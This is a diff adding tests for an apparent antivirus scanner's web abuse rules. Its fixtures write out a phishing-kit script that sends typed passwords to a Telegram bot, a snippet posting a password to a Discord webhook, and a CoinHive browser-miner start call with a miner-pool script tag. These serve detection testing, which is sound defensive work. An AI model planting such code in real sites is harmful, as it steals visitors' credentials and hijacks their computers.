@@ -249,3 +249,38 @@ describe('signatures + reputation', () => {
     expect(mergeReputation(h, [null, { sha256: h, knownMalicious: null, malwareName: null, trust: 80, fileName: null }, rep])?.knownMalicious).toBe('malshare.com');
   });
 });
+
+describe('web abuse rules (DIP-0036 labeler)', () => {
+  const kit = `<form id="f"><input name="email"><input type="password" id="pass"></form>
+<script>document.getElementById('f').onsubmit=function(){fetch('https://api.telegram.org/bot123456:AAH-xyz/sendMessage',{method:'POST',body:JSON.stringify({chat_id:1,text:document.getElementById('pass').value})})}</script>`;
+  it('flags a phishing kit that posts passwords to a Telegram bot', async () => {
+    const r = await scan('login.html', kit);
+    expect(r.verdict).toBe('malicious');
+    expect(ids(r)).toContain('CrushAV.Web.PhishKitExfil');
+  });
+  it('flags a separate JS file reading the password and posting to a Discord webhook', async () => {
+    const js = `const p=document.querySelector('#password').value;fetch("https://discord.com/api/webhooks/112233445566/tok",{method:"POST",body:p})`;
+    expect(ids(await scan('app.js', js))).toContain('CrushAV.Web.PhishKitExfil');
+  });
+  it('leaves a contact form that notifies a Telegram bot alone (no credential)', async () => {
+    const ok = `<form><input name="msg"></form><script>fetch('https://api.telegram.org/bot1:x/sendMessage',{method:'POST'})</script>`;
+    expect((await scan('contact.html', ok)).verdict).toBe('clean');
+  });
+  it('leaves a normal login page alone', async () => {
+    expect((await scan('login.html', '<form action="/login" method="post"><input type="password" name="password"></form>')).verdict).toBe('clean');
+  });
+  it('does not flag write-ups that mention the pattern in markdown', async () => {
+    expect((await scan('notes.md', kit)).verdict).toBe('clean');
+  });
+  it('flags a started in-browser miner and a miner-pool script tag', async () => {
+    const started = `<script>var m=new CoinHive.Anonymous('abcdefgh12345678',{throttle:0.3});m.start();</script>`;
+    const r = await scan('index.html', started);
+    expect(ids(r)).toContain('CrushAV.Web.BrowserMiner');
+    expect(r.verdict).toBe('malicious');
+    const tag = '<script src="https://www.hostingcloud.racing/abcd.js"></script>';
+    expect(ids(await scan('index.html', tag))).toContain('CrushAV.Web.BrowserMiner');
+  });
+  it('does not flag a page that only names a miner', async () => {
+    expect((await scan('blog.html', '<p>CoinHive shut down in 2019; CoinHive.Anonymous was its API.</p>')).verdict).toBe('clean');
+  });
+});
